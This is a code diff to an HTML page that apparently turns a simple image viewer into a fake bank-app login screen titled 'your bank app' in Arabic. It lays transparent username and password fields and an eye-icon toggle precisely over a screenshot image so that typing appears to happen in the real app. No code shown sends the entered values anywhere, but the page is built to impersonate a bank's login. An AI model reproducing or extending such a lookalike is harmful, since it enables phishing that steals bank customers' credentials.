@@ -3,61 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>عرض الصورة</title>
+    <title>تطبيق بنكك</title>
     <style>
         html, body {
             margin: 0;
             padding: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw;
+            height: 100vh;
             overflow: hidden;
             background-color: #000;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        .container {
+            position: relative;
+            /* Ultra-robust viewport scaling bypassing flex container size calculation bugs */
+            width: 100vw;
+            height: 100vh;
+            max-width: 56.25vh; /* Aspect ratio 9:16 */
+            max-height: 177.78vw; /* Aspect ratio 16:9 */
+            aspect-ratio: 9 / 16;
+            display: block;
+            box-sizing: border-box;
+            background-color: #000;
         }
         img {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Shows the image fully without cropping or zooming */
+            object-fit: fill;
             user-select: none;
+            display: block;
+        }
+        /* Interactive Text Input Overlay */
+        .input-overlay {
+            position: absolute;
+            left: 8%;
+            top: 30.8%;
+            width: 84%;
+            height: 6.8%;
+            background-color: transparent; /* Fully transparent to let the original background image show through */
+            display: flex;
+            align-items: center;
+            box-sizing: border-box;
+            z-index: 10;
+        }
+        .input-overlay .spacer {
+            width: 18%; /* Cover original user icon area on the left with transparent space */
+            height: 100%;
+            flex-shrink: 0;
+        }
+        .input-overlay input {
+            flex: 1;
+            height: 100%;
+            border: none;
+            background-color: transparent; /* Fully transparent initially */
+            outline: none;
+            font-size: 13px;
+            text-align: right;
+            direction: rtl;
+            font-family: inherit;
+            color: #000000;
+            padding: 0 12px;
+            border-radius: 0 8px 8px 0;
+        }
+        .input-overlay input:not(:placeholder-shown) {
+            background-color: #ffffff; /* Cover original background image text when user types */
+        }
+
+        /* Interactive Password Input Overlay */
+        .password-overlay {
+            position: absolute;
+            left: 8%;
+            top: 39.8%;
+            width: 84%;
+            height: 6.8%;
+            background-color: transparent; /* Fully transparent to let the original background image show through */
+            display: flex;
+            align-items: center;
+            box-sizing: border-box;
+            z-index: 10;
+        }
+        .password-overlay .toggle-visibility {
+            width: 18%; /* Transparent clickable area covering the original eye icon on the left */
+            height: 100%;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+            outline: none;
+            flex-shrink: 0;
+        }
+        .password-overlay input {
+            flex: 1;
+            height: 100%;
+            border: none;
+            background-color: transparent; /* Fully transparent initially */
+            outline: none;
+            font-size: 13px;
+            text-align: right;
+            direction: rtl;
+            font-family: inherit;
+            color: #000000;
+            padding: 0 12px;
+            border-radius: 0 8px 8px 0;
+        }
+        .password-overlay input:not(:placeholder-shown) {
+            background-color: #ffffff; /* Cover original background image text when user types */
         }
     </style>
 </head>
 <body>
-    <!-- Only the full, non-cropped image on a pure black background -->
-    <img id="myImage" src="https://i.pinimg.com/736x/97/ce/cb/97cecbf673947407df9a03dcf9426403.jpg" alt="Wallpaper">
+    <div class="container">
+        <!-- Background Image -->
+        <img id="myImage" src="https://i.pinimg.com/736x/97/ce/cb/97cecbf673947407df9a03dcf9426403.jpg" alt="Wallpaper">
+        
+        <!-- Interactive Username Field Overlay -->
+        <div class="input-overlay">
+            <div class="spacer"></div>
+            <input type="text" placeholder=" ">
+        </div>
+
+        <!-- Interactive Password Field Overlay -->
+        <div class="password-overlay">
+            <button class="toggle-visibility" onclick="togglePasswordVisibility()" type="button" aria-label="عرض كلمة المرور"></button>
+            <input id="passwordInput" type="password" placeholder=" ">
+        </div>
+    </div>
 
     <script>
-        const imageUrl = "https://i.pinimg.com/736x/97/ce/cb/97cecbf673947407df9a03dcf9426403.jpg";
-
-        function triggerDownload() {
-            const a = document.createElement('a');
-            a.href = imageUrl;
-            a.download = 'pinterest_image.jpg';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('passwordInput');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
         }
-
-        window.onload = function() {
-            fetch(imageUrl)
-                .then(response => response.blob())
-                .then(blob => {
-                    const blobUrl = URL.createObjectURL(blob);
-                    const link = document.createElement('a');
-                    link.href = blobUrl;
-                    link.download = 'pinterest_image.jpg';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                    URL.revokeObjectURL(blobUrl);
-                })
-                .catch(err => {
-                    console.log("Error fetching blob, trying direct download", err);
-                    triggerDownload();
-                });
-        };
     </script>
 </body>
 </html>
